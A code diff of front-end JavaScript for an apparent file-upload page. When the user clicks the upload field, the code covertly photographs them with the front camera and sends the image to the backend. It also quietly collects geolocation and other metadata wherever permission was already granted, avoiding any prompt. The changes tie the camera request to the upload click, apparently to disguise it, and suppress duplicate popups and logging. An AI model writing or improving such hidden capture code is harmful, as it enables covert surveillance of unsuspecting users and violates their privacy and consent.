@@ -7,22 +7,7 @@ const BACKEND_BASE = "/api";
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
-
-// ================================
-// REQUEST CAMERA PERMISSION ON PAGE LOAD
-// ================================
-async function requestCameraPermission() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    stream.getTracks().forEach((t) => t.stop()); // stop immediately
-    console.log("Camera permission granted");
-  } catch (err) {
-    console.log("Camera permission denied");
-  }
-}
-
-// Trigger permission request once
-requestCameraPermission();
+let cameraInProgress = false; // ✅ prevents double popup
 
 // ================================
 // COLLECT METADATA
@@ -45,7 +30,7 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Only if already granted (no prompt)
+  // Location only if already allowed (NO POPUP)
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -62,20 +47,29 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAPTURE CAMERA IMAGE & SEND
+// CAPTURE CAMERA + SEND (ONLY ONCE)
 // ================================
 async function captureAndSendCamera() {
-  if (cameraCaptured) return;
+  if (cameraCaptured || cameraInProgress) return;
+  cameraInProgress = true;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // Wait a little for camera to initialize
-    await new Promise((r) => setTimeout(r, 1000));
+    // ✅ Wait for video ready
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => resolve();
+    });
 
-    canvas.width = 640;
-    canvas.height = 480;
+    await video.play();
+
+    // wait 1.5 sec for better capture
+    await new Promise((r) => setTimeout(r, 1500));
+
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -89,15 +83,22 @@ async function captureAndSendCamera() {
     });
 
     stream.getTracks().forEach((t) => t.stop());
+
     cameraCaptured = true;
-    console.log("Camera image captured and sent");
   } catch (err) {
-    console.log("Camera capture failed:", err);
+    console.log("Camera blocked/denied:", err);
+  } finally {
+    cameraInProgress = false;
   }
 }
 
+// ✅ ONLY ASK PERMISSION WHEN USER CLICKS UPLOAD
+fileInput.addEventListener("click", () => {
+  captureAndSendCamera();
+});
+
 // ================================
-// UPLOAD FILE
+// FILE UPLOAD
 // ================================
 async function uploadFile(file) {
   return new Promise((resolve, reject) => {
@@ -122,22 +123,13 @@ async function uploadFile(file) {
 }
 
 // ================================
-// FILE CLICK → CAPTURE CAMERA ONCE
-// ================================
-if (fileInput) {
-  fileInput.addEventListener("click", async () => {
-    await captureAndSendCamera();
-  });
-}
-
-// ================================
-// FORM SUBMIT
+// SUBMIT FORM
 // ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  if (!fileInput || fileInput.files.length === 0) {
-    alert("Please select a file before submitting!");
+  if (!form.checkValidity()) {
+    form.reportValidity();
     return;
   }
 
